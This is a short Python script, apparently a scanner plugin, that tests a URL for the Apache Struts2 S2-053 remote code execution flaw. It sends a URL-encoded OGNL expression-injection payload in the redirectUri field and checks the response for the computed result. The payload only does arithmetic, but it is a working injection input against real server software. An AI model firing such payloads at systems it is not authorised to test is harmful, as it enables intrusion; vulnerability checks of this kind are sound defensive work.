import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-053 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    try:
        payload = r'''redirectUri=%25%7B526154872*12396111%7D'''
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = requests.post(url, headers=headers, timeout=3, data=payload)
        if '1285306632' in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = url
            relsult['position'] = 'data'
            relsult['payload'] = payload
            relsult['about'] = 'https://github.com/vulhub/vulhub/blob/master/struts2/s2-053/README.zh-cn.md'
        return relsult
    except:
        return relsult



